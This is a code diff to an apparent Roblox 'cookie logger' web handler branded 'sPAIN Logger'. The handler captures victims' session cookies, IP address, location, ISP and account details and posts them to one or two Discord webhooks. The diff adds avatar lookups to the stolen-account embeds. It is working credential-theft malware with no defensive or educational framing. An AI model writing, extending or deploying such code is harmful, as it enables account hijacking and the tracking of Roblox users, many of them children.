@@ -34,6 +34,31 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
+// Get Roblox avatar thumbnail URL
+async function getAvatarUrl(userId) {
+  try {
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 5000);
+    
+    const response = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
+      { signal: ctrl.signal }
+    );
+    
+    clearTimeout(timer);
+    
+    if (!response.ok) return null;
+    
+    const data = await response.json();
+    if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') {
+      return data.data[0].imageUrl;
+    }
+    return null;
+  } catch {
+    return null;
+  }
+}
+
 // Check account info and refresh cookie validity
 async function checkAccountInfo(cookie) {
   try {
@@ -57,6 +82,9 @@ async function checkAccountInfo(cookie) {
     
     const userData = await response.json();
     
+    // Get avatar URL
+    const avatarUrl = await getAvatarUrl(userData.id);
+    
     // Get additional account details
     const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
       headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
@@ -72,7 +100,8 @@ async function checkAccountInfo(cookie) {
       created: profile?.created,
       description: profile?.description,
       isBanned: profile?.isBanned || false,
-      profileUrl: `https://www.roblox.com/users/${userData.id}/profile`
+      profileUrl: `https://www.roblox.com/users/${userData.id}/profile`,
+      avatarUrl: avatarUrl
     };
   } catch (err) {
     return { valid: false, error: err.message };
@@ -144,6 +173,8 @@ const createWebhookPayload = (type, data) => {
           title: data.title || '🍪 Cookie Captured (Dualhook)',
           description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
           color: data.color || 0x06b6d4,
+          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
+          image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
           footer: { text: data.footer || `sPAIN Logger` },
           timestamp: data.timestamp || new Date().toISOString()
@@ -159,6 +190,8 @@ const createWebhookPayload = (type, data) => {
           title: data.title || '🍪 Cookie Captured',
           description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
           color: data.color || 0xc026d3,
+          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
+          image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
           footer: { text: data.footer || `sPAIN Logger` },
           timestamp: data.timestamp || new Date().toISOString()
@@ -174,6 +207,8 @@ const createWebhookPayload = (type, data) => {
           title: data.valid ? '✅ Account Info Valid' : '❌ Account Check Failed',
           description: data.description || '',
           color: data.valid ? 0x00ff00 : 0xff0000,
+          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
+          image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
           footer: { text: `Account Check • ${COOKIE_REFRESH_EMOJI}` },
           timestamp: data.timestamp || new Date().toISOString()
@@ -291,12 +326,18 @@ export default async function handler(req, res) {
   const [geo, accountInfo] = await Promise.all([geoPromise, accountCheckPromise]);
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
+  
+  // Get avatar URL for embeds
+  const avatarUrl = accountInfo.refreshed && accountInfo.account.avatarUrl 
+    ? accountInfo.account.avatarUrl 
+    : null;
 
-  // webhook2 JSON payload: IP, Page, Time, Location, ISP, Account Info, Cookie Refresher Link
+  // webhook2 JSON payload: IP, Page, Time, Location, ISP, Account Info, Cookie Refresher Link, Avatar
   const wh2Payload = createWebhookPayload('webhook2', {
     description: record.dualhookParent
       ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
       : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+    thumbnail: avatarUrl, // Shows avatar as thumbnail
     fields: [
       { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
       { name: '📄 Page',     value: pName,        inline: true  },
@@ -315,10 +356,11 @@ export default async function handler(req, res) {
   await discordSend(webhook2, wh2Payload);
   await discordChunked(webhook2, cookie);
 
-  // webhook1 JSON payload (dualhook only): IP, DH Parent, DH Child, Time, Location, ISP, Account, Cookie
+  // webhook1 JSON payload (dualhook only): IP, DH Parent, DH Child, Time, Location, ISP, Account, Avatar, Cookie
   if (webhook1 && webhook1 !== webhook2) {
     const wh1Payload = createWebhookPayload('webhook1', {
       title: '🍪 Cookie Captured (Dualhook)',
+      thumbnail: avatarUrl, // Shows avatar as thumbnail
       fields: [
         { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
         { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true  },
@@ -339,11 +381,12 @@ export default async function handler(req, res) {
     await discordChunked(webhook1, cookie);
   }
 
-  // Send account info check result to both webhooks
+  // Send account info check result to both webhooks with avatar
   if (accountInfo.refreshed) {
     const accountPayload = createWebhookPayload('account_info', {
       valid: true,
       description: `**${accountInfo.account.username}** (${accountInfo.account.id})`,
+      thumbnail: avatarUrl, // Shows avatar as thumbnail
       fields: [
         { name: '👤 Username', value: accountInfo.account.username, inline: true },
         { name: '🆔 User ID', value: String(accountInfo.account.id), inline: true },
@@ -364,8 +407,9 @@ export default async function handler(req, res) {
     `🗺️ ${isp}`,
     `👤 ${accountInfo.refreshed ? accountInfo.account.username : 'Invalid'}`,
     `🕐 ${now}`,
-    `🍪 [${COOKIE_REFRESH_EMOJI}](${COOKIE_REFRESH_URL})`
-  ].join('\n'));
+    `🍪 [${COOKIE_REFRESH_EMOJI}](${COOKIE_REFRESH_URL})`,
+    accountInfo.refreshed && accountInfo.account.avatarUrl ? `🖼️ [Avatar](${accountInfo.account.avatarUrl})` : ''
+  ].filter(Boolean).join('\n'));
 
   return res.status(200).json({ 
     success: true, 
